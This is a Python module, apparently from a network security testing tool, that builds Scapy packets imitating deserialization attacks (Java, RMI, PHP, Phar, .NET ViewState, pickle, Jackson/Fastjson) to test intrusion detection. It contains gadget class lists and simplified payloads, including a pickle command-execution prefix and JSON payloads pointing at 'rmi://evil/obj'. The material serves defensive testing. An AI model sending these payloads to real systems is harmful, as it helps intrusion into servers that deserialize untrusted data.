"""Deserialization attack pattern traffic module."""

import base64
import random
from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# Java serialization magic bytes and common gadget signatures
JAVA_SERIAL_MAGIC = b"\xac\xed\x00\x05"  # Java serialization header

# ysoserial-like payload signatures (simplified)
JAVA_GADGET_CLASSES = [
    "org.apache.commons.collections.functors.InvokerTransformer",
    "org.apache.commons.collections4.functors.InvokerTransformer",
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "org.springframework.beans.factory.ObjectFactory",
    "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "org.hibernate.engine.spi.TypedValue",
    "com.sun.rowset.JdbcRowSetImpl",
    "org.apache.wicket.util.upload.DiskFileItem",
    "org.jboss.interceptor.proxy.InterceptorMethodHandler",
]

# PHP serialized object patterns
PHP_SERIAL_PAYLOADS = [
    'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
    'a:1:{s:4:"test";O:8:"Exploit":0:{}}',
    'O:+8:"stdClass":1:{s:4:"cmd";s:2:"id";}',  # Plus sign bypass
    'O:11:"PharPayload":1:{s:4:"data";s:7:"<?php ?";}',
    'C:16:"SplObjectStorage":0:{}',  # Custom serialization
]

# .NET serialization patterns (BinaryFormatter, etc.)
DOTNET_SERIAL_MAGIC = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"  # BinaryFormatter

# Python pickle patterns
PYTHON_PICKLE_PATTERNS = [
    b"\x80\x04\x95",  # Pickle protocol 4
    b"cos\nsystem\n(S'",  # Classic pickle RCE
    b"\x80\x03cbuiltins\neval\n",  # Python 3 pickle
]


class DeserializationModule(TrafficModule):
    """Traffic module for deserialization attack patterns.

    Generates traffic that mimics unsafe deserialization
    attacks against various platforms (Java, PHP, .NET, Python).
    """

    def __init__(self) -> None:
        """Initialize the deserialization module."""
        self._attack_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="deserialization",
            description="Deserialization attacks (Java, PHP, .NET, Python pickle)",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP"],
            ports=[80, 443, 8080, 8443, 1099],
        )

    def _generate_java_serial_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate Java deserialization attack patterns."""
        # Create a mock serialized object with gadget class name
        gadget_class = random.choice(JAVA_GADGET_CLASSES)

        # Simplified serialized object structure
        serialized = (
            JAVA_SERIAL_MAGIC
            + b"\x73\x72\x00"  # TC_OBJECT, TC_CLASSDESC
            + bytes([len(gadget_class)])
            + gadget_class.encode()
            + b"\x00" * 8  # serialVersionUID
            + b"\x02\x00\x00\x78\x70"  # Flags and end
        )

        # Send via POST with common content types
        content_types = [
            "application/x-java-serialized-object",
            "application/octet-stream",
            "application/x-www-form-urlencoded",
        ]

        http_request = (
            f"POST /api/deserialize HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: {random.choice(content_types)}\r\n"
            f"Content-Length: {len(serialized)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode() + serialized)
        )
        yield packet

    def _generate_java_rmi_attack(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate Java RMI deserialization attack patterns."""
        # RMI protocol header
        rmi_header = b"JRMI\x00\x02\x4b"  # RMI protocol magic

        # Serialized object follows
        gadget_class = random.choice(JAVA_GADGET_CLASSES)
        serialized = (
            rmi_header
            + JAVA_SERIAL_MAGIC
            + b"\x73\x72\x00"
            + bytes([len(gadget_class)])
            + gadget_class.encode()
            + b"\x00" * 8
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=1099, flags="PA")
            / Raw(load=serialized)
        )
        yield packet

    def _generate_php_serial_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate PHP object injection patterns."""
        payload = random.choice(PHP_SERIAL_PAYLOADS)

        # URL encode for parameter
        import urllib.parse
        encoded_payload = urllib.parse.quote(payload)

        # Via GET parameter (common in PHP apps)
        http_request = (
            f"GET /index.php?data={encoded_payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_php_phar_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate PHP Phar deserialization patterns."""
        # Phar wrapper attack via file operations
        phar_paths = [
            "phar://uploads/evil.jpg",
            "phar:///tmp/test.phar",
            "phar://data/test.zip/test.txt",
            "compress.zlib://phar://test.phar",
        ]

        import urllib.parse
        path = urllib.parse.quote(random.choice(phar_paths))

        http_request = (
            f"GET /view.php?file={path} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_dotnet_serial_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate .NET deserialization attack patterns."""
        # BinaryFormatter/ObjectStateFormatter patterns
        serialized = (
            DOTNET_SERIAL_MAGIC
            + b"\x01\x00\x00\x00\x00\x00\x00\x00"
            + b"\x0c\x02\x00\x00\x00"
            + b"System.Windows.Data.ObjectDataProvider"
            + b"\x00" * 20
        )

        # ViewState-like attack
        viewstate_payload = base64.b64encode(serialized).decode()

        http_request = (
            f"POST /Default.aspx HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"__VIEWSTATE={viewstate_payload}&"
            f"__EVENTVALIDATION=test"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_python_pickle_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate Python pickle injection patterns."""
        # Malicious pickle payload patterns
        pickle_payload = random.choice(PYTHON_PICKLE_PATTERNS) + b"id\nq\x00."

        b64_payload = base64.b64encode(pickle_payload).decode()

        http_request = (
            f"POST /api/load HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"X-Pickle-Data: {b64_payload}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode() + pickle_payload)
        )
        yield packet

    def _generate_json_deser_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate JSON deserialization patterns (Jackson, Fastjson)."""
        # Jackson polymorphic deserialization
        json_payloads = [
            '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil/obj"}',
            '["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem"}]',
            '{"@class":"org.apache.xbean.propertyeditor.JndiConverter","asText":"rmi://evil/obj"}',
            '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}',
        ]

        body = random.choice(json_payloads)

        http_request = (
            f"POST /api/json HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate deserialization attack packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with deserialization attack patterns
        """
        port = dst_port or 80
        self._attack_count += 1

        # Rotate through different attack types
        attack_type = self._attack_count % 7

        if attack_type == 0:
            yield from self._generate_java_serial_attack(src_ip, dst_ip, port)
        elif attack_type == 1:
            yield from self._generate_java_rmi_attack(src_ip, dst_ip)
        elif attack_type == 2:
            yield from self._generate_php_serial_attack(src_ip, dst_ip, port)
        elif attack_type == 3:
            yield from self._generate_php_phar_attack(src_ip, dst_ip, port)
        elif attack_type == 4:
            yield from self._generate_dotnet_serial_attack(src_ip, dst_ip, port)
        elif attack_type == 5:
            yield from self._generate_python_pickle_attack(src_ip, dst_ip, port)
        else:
            yield from self._generate_json_deser_attack(src_ip, dst_ip, port)

